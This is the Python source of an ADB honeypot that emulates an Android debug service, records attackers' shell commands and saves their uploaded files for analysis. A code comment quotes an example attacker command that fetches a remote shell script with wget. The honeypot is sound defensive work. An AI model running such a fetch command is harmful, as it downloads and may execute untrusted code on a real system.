#!/usr/bin/env python2

from argparse import ArgumentParser
from datetime import datetime
import threading
import binascii
import hashlib
import logging
import socket
import struct
import queue
import json
import time
import sys
import os

#package imports
from .config import CONFIG, OUTPUT_PLUGINS
from .responses import cmd_responses
from . import protocol
from . import outputs

__version__ = '1.00'

MAX_READ_COUNT = 4096 * 4096
# sleep 1 second after each empty packets, wait 1 hour in total
MAX_EMPTY_PACKETS = 360

DEVICE_ID = CONFIG.get('honeypot', 'device_id')
log_q = queue.Queue()

class OutputLogger():
    def __init__(self, log_q):
        self.log_q = log_q
        self.debug('OutputLogger init!')

    def debug(self, message):
        level = logging.DEBUG
        self.log_q.put((message, level))

    def info(self, message):
        level = logging.INFO
        self.log_q.put((message, level))
    
    def error(self, message):
        level = logging.ERROR
        self.log_q.put((message, level))

    def write(self, message):
        self.log_q.put(message)

logger = OutputLogger(log_q)

class OutputWriter(threading.Thread):
    def __init__(self):
        logger.debug("Creating OutputWriter!")
        threading.Thread.__init__(self)
        self.process = True
        self.output_writers = []
        for output in OUTPUT_PLUGINS:
            output_writer = __import__('adbhoney.outputs.{}'\
                    .format(output), globals(), locals(), ['output']).Output()
            self.output_writers.append(output_writer)

    def run(self):
        logger.debug("Starting OutputWriter!")
        while not log_q.empty() or self.process:
            try:
                log = log_q.get(timeout=.1)
            except queue.Empty:
                continue
            if type(log) is tuple:
                self.log(*log)
            else:
                self.write(log)
            log_q.task_done()

    def stop(self):
        self.process = False
    
    def write(self, log):
        for writer in self.output_writers:
            writer.write(log)
    
    def log(self, log, level):
        first_logger = self.output_writers[0]
        if first_logger.__name__ == 'output_log':
            first_logger.write(log, level)

class ADBConnection(threading.Thread):
    def __init__(self, conn, addr):
        threading.Thread.__init__(self)
        self.conn = conn
        self.addr = addr
        self.run()

    def report(self, obj):
        obj['timestamp'] = datetime.utcnow().isoformat() + 'Z'
        obj['unixtime'] = int(time.time())
        obj['session'] = self.session
        obj['sensor'] = CONFIG.get('honeypot', 'hostname')
        logger.debug("Placing {} on log_q".format(obj))
        logger.write(obj)

    def run(self):
        logger.debug("Processing new connection!")
        self.process_connection()

    def send_message(self, command, arg0, arg1, data):
        newmessage = protocol.AdbMessage(command, arg0, arg1, data)
        logger.debug('sending: {}'.format(newmessage))
        self.conn.sendall(newmessage.encode())

    def send_twice(self, command, arg0, arg1, data):
        self.send_message(command, arg0, arg1, data)
        self.send_message(command, arg0, arg1, data)

    def recv_data(self):
        debug_content = bytes()
        empty_packets = 0
        try:
            command = self.conn.recv(4)
            if not command:
                empty_packets += 1
                if empty_packets > MAX_EMPTY_PACKETS:
                    return None
                # wait for more data
                time.sleep(1)
                return None
            empty_packets = 0
            arg1 = self.conn.recv(4)
            arg2 = self.conn.recv(4)
            data_length_raw = self.conn.recv(4)
            data_length = struct.unpack('<L', data_length_raw)[0]
            data_crc = self.conn.recv(4)
            magic = self.conn.recv(4)

            data_content = bytes()

            if data_length > 0:
                # prevent reading the same stuff over and over again from some other attackers and locking the honeypot
                # max 1 byte read 64*4096 times (max packet length for ADB)
                read_count = 0

                while len(data_content) < data_length and read_count < MAX_READ_COUNT:
                    read_count += 1
                    # don't overread the content of the next data packet
                    bytes_to_read = data_length - len(data_content)
                    data_content += self.conn.recv(bytes_to_read)
            # check integrity of read data
            if len(data_content) < data_length:
                logger.error("data content length is greater than data_length, corrupt data!")
                # corrupt content, abort the self.connection (probably not an ADB client)
                data = None
            else:
                # assemble a full data packet as per ADB specs
                data = command + arg1 + arg2 + data_length_raw + data_crc + magic + data_content
        except Exception as e:
            logger.info("Connection reset by peer.")
            raise EOFError
        return data
    
    def parse_data(self, data):
        try:
            message = protocol.AdbMessage.decode(data)[0]
            logger.debug("decoded message {}".format(message))
            string = str(message)
            if len(string) > 96:
                logger.debug('<<<<{} ...... {}'.format(string[0:64], string[-32:]))
            else:
                logger.debug('<<<<{}'.format(string))
            return message
        except Exception as e:
            logger.error(e)
            # don't print anything, a lot of garbage coming in usually, just drop the connection
            raise
        #return None

    def dump_file(self, f):
        DL_DIR = CONFIG.get('honeypot', 'download_dir')
        if DL_DIR and not os.path.exists(DL_DIR):
            os.makedirs(DL_DIR)

        sha256sum = hashlib.sha256(f['data']).hexdigest()
        fn = '{}.raw'.format(sha256sum)
        fp = os.path.join(DL_DIR, fn)
        logger.info('File uploaded: {}, name: {}, bytes: {}'.format(fp, f['name'], len(f['data'])))
        obj = {
            'eventid': 'adbhoney.session.file_upload',
            'src_ip': self.addr[0],
            'shasum': sha256sum,
            'outfile': fp,
            'filename': f['name']
        }
        self.report(obj)
        #Don't overwrite the file if it already exists
        if not os.path.exists(fp):
            with open(fp, 'wb') as file_out:
                file_out.write(f['data'])

    def recv_binary_chunk(self, message, data, f):
        logger.info("Received binary chunk of size: {}".format(len(message.data)))
        # look for that shitty DATAXXXX where XXXX is the length of the data block that's about to be sent
        # (i.e. DATA\x00\x00\x01\x00)
        if message.command == protocol.CMD_WRTE and 'DATA' in message.data:
            data_index = message.data.index('DATA')
            payload_fragment = message.data[:data_index] + message.data[data_index + 8:]
            f['data'] += payload_fragment
        elif message.command == protocol.CMD_WRTE:
            f['data'] += message.data

        # truncate
        if 'DONE' in message.data:
            f['data'] = f['data'][:-8]
            self.sending_binary = False
            self.dump_file(f)

            # ADB has a shitty state machine, sometimes we need to send duplicate messages
            self.send_twice(protocol.CMD_WRTE, 2, message.arg0, 'OKAY')
            self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')

        if message.command != protocol.CMD_WRTE:
            f['data'] += data

        self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')

        return f


    def recv_binary(self, message, f):
        logger.info("Receiving binary file...")
        self.sending_binary = True
        predata = message.data.split('DATA')[0]
        if predata:
            parts = predata.split(',')
            prefix = '\x00\x00\x00'
            if prefix in parts[0]:
                name_parts = parts[0].split(prefix)
                if len(name_parts) == 1:
                    f['name'] = name_parts[0]
                else:
                    f['name'] = name_parts[1]
            else:
                f['name'] = parts[0]
            #filename = parts[0].split('\x00\x00\x00')[1]

        # if the message is really short, wrap it up
        if 'DONE' in message.data[-8:]:
            self.sending_binary = False
            f['data'] = message.data.split('DATA')[1][4:-8]
            self.send_twice(protocol.CMD_WRTE, 2, message.arg0, 'OKAY')
            self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')
            self.dump_file(f)
        else:
            f['data'] = message.data.split('DATA')[1][4:]

        self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')

        return f

    def recv_shell_cmd(self, message):
        logger.debug("Entering recv_shell_cmd")
        self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')
        
        #command will be 'shell:cd /;wget http://someresource.com/test.sh\x00'
        #Remove first six chars and last null byte.
        cmd = message.data[6:-1]
        logger.info("shell command is {}, len {}".format(cmd, len(cmd)))
        if cmd in cmd_responses:
            response = cmd_responses[cmd]
        else:
            response = ""

        # change the WRTE contents with whatever you'd like to send to the attacker
        self.send_message(protocol.CMD_WRTE, 2, message.arg0, response)
        self.send_message(protocol.CMD_CLSE, 2, message.arg0, '')
        # print the shell command that was sent
        # also remove trailing \00
        logger.info('{}\t{}'.format(self.addr[0], message.data[:-1]))
        obj = {
            'eventid': 'adbhoney.command.input',
            'input': cmd,
            'src_ip': self.addr[0],
        }
        self.report(obj)

    def process_connection(self):
        start = time.time()
        self.session = binascii.hexlify(os.urandom(6))
        localip = socket.gethostbyname(socket.gethostname())
        logger.info('{} connection start ({})'.format(self.addr[0], self.session))
        obj = {
            'eventid': 'adbhoney.session.connect',
            'src_ip': self.addr[0],
            'src_port': self.addr[1],
            'dst_ip': localip,
            'dst_port': CONFIG.get('honeypot', 'port'),
        }
        self.report(obj)

        states = []
        self.sending_binary = False
        f = {'name': '', 'data': ''}
        filename = 'unknown'
        closedmessage = 'Connection closed'
        while True:
            try:
                data = self.recv_data()
            except EOFError:
                break

            if not data:
                logger.info("data is none?: {}".format(data))
                break

            logger.debug("Received data of length: {}".format(len(data)))
            message = self.parse_data(data)

            # keep a record of all the previous states in order to handle some weird cases
            states.append(message.command)
            
            #Continue receiving binary
            if self.sending_binary:
                f = self.recv_binary_chunk(message, data, f)
                continue
            # look for the data header that is first sent when initiating a data connection
            #  /sdcard/stuff/exfiltrator-network-io.PNG,33206DATA
            elif 'DATA' in message.data[:128]:
                f = self.recv_binary(message, f)
                continue
            else:   # regular flow
                if len(states) >= 2 and states[-2:] == [protocol.CMD_WRTE, protocol.CMD_WRTE]:
                    logger.debug("Received Write/Write")
                    # last block of messages before the big block of data
                    filename = message.data
                    self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')
                    # why do I have to send the command twice??? science damn it!
                    self.send_twice(protocol.CMD_WRTE, 2, message.arg0, 'STAT\x07\x00\x00\x00')
                elif states[-1] == protocol.CMD_WRTE and 'QUIT' in message.data:
                    logger.debug("Received quit command.")
                    #self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')
                    self.send_message(protocol.CMD_CLSE, 2, message.arg0, '')
                elif len(states) > 2 and states[-2:] == [protocol.CMD_OKAY, protocol.CMD_WRTE]:
                    logger.debug("Received Okay/Write")
                    self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')
                    # self.send_message(conn, protocol.CMD_WRTE, 2, message.arg0, 'FAIL', CONFIG)
                elif len(states) > 2 and states[-2:] == [protocol.CMD_WRTE, protocol.CMD_OKAY]:
                    logger.debug("Received Write/Okay")
                    self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')
                    # self.send_message(conn, protocol.CMD_WRTE, 2, message.arg0, 'FAIL', CONFIG)
                elif len(states) > 1 and states[-2:] == [protocol.CMD_OPEN, protocol.CMD_WRTE]:
                    logger.debug("Received Open/Write")
                    self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')
                    if len(message.data) > 8:
                        self.send_twice(protocol.CMD_WRTE, 2, message.arg0, 'STAT\x01\x00\x00\x00')
                        filename = message.data[8:]
                elif states[-1] == protocol.CMD_OPEN and 'shell' in message.data:
                    logger.debug("Received shell command.")
                    self.recv_shell_cmd(message)
                elif states[-1] == protocol.CMD_CNXN:
                    logger.debug("Received connection command.")
                    self.send_message(protocol.CMD_CNXN, 0x01000000, 4096, DEVICE_ID)
                elif states[-1] == protocol.CMD_OPEN and 'sync' not in message.data:
                    logger.debug("Received sync command.")
                    self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')
                elif states[-1] == protocol.CMD_OPEN:
                    logger.debug("Received open command.")
                    self.send_message(protocol.CMD_OKAY, 2, message.arg0, '')
                elif states[-1] == protocol.CMD_CLSE and not self.sending_binary:
                    logger.debug("Received close command, 1.")
                    #self.send_message(protocol.CMD_CLSE, 2, message.arg0, '')
        duration = time.time() - start
        logger.info('{}\t{}\tconnection closed'.format(duration, self.addr[0]))
        obj = {
            'eventid': 'adbhoney.session.closed',
            'src_ip': self.addr[0],
            'duration': '{0:.2f}'.format(duration),
        }
        self.report(obj)
        self.conn.close()

class ADBHoneyPot:
    def __init__(self):
        self.bind_addr = CONFIG.get('honeypot', 'address')
        self.bind_port = int(CONFIG.get('honeypot', 'port'))
        self.download_dir = CONFIG.get('honeypot', 'download_dir')

    def accept_connections(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        """ Set TCP keepalive on an open socket.

            It activates after 1 second (after_idle_sec) of idleness,
            then sends a keepalive ping once every 1 seconds (interval_sec),
            and closes the connection after 100 failed ping (max_fails)
        """
        #self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # pylint: disable=no-member
        if hasattr(socket, 'TCP_KEEPIDLE'):
            self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 1)
        elif hasattr(socket, 'TCP_KEEPALIVE'):
            self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPALIVE, 1)
        if hasattr(socket, 'TCP_KEEPINTVL'):
            self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 1)
        if hasattr(socket, 'TCP_KEEPCNT'):
            self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 100)
        # pylint: enable=no-member
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, True)
        self.sock.bind((self.bind_addr, self.bind_port))
        self.sock.listen(1)
        logger.info('Listening on {}:{}.'.format(self.bind_addr, self.bind_port))
        try:
            while True:
                conn, addr = self.sock.accept()
                logger.info("Received a connection, creating an ADBConnection.")
                thread = threading.Thread(target=ADBConnection, args=(conn, addr))
                thread.daemon = True
                thread.start()
        except KeyboardInterrupt:
            logger.info('Exiting...')
            self.sock.close()
            if output_writer:
                output_writer.stop()

def main():
    global logger
    global output_writer

    # Eventually these will be filled from a config file
    parser = ArgumentParser()

    parser.add_argument('-v', '--version', action='version', version="%(prog)s" + __version__)
    parser.add_argument('-a', '--addr', type=str, default=None, help='Address to bind to')
    parser.add_argument('-p', '--port', type=int, default=None, help='Port to listen on')
    parser.add_argument('-d', '--dlfolder', type=str, default=None, help='Directory for the uploaded samples (default: current)')
    parser.add_argument('-l', '--logfile', type=str, default=None, help='Log file (default: adbhoney.log')
    parser.add_argument('-j', '--jsonlog', type=str, default=None, help='JSON log file')
    parser.add_argument('-s', '--sensor', type=str, default=None, help='Sensor/Host name')

    args = parser.parse_args()

    if args.addr:
        CONFIG.set('honeypot', 'address', args.addr)
    if args.port:
        CONFIG.set('honeypot', 'port', str(args.port))
    if args.dlfolder:
        CONFIG.set('honeypot', 'download_dir', str(args.port))
    if args.logfile:
        CONFIG.set('honeypot', 'log_file', args.logfile)
    if args.jsonlog:
        CONFIG.set('output_json', 'log_file', args.jsonlog)
    if args.sensor:
        CONFIG.set('honeypot', 'hostname', args.sensor)

    output_writer = OutputWriter()
    output_writer.start()
    
    logger.info("Configuration loaded with {} as output plugins".format(OUTPUT_PLUGINS))

    honeypot = ADBHoneyPot()
    honeypot.accept_connections()

if __name__ == '__main__':
    main()
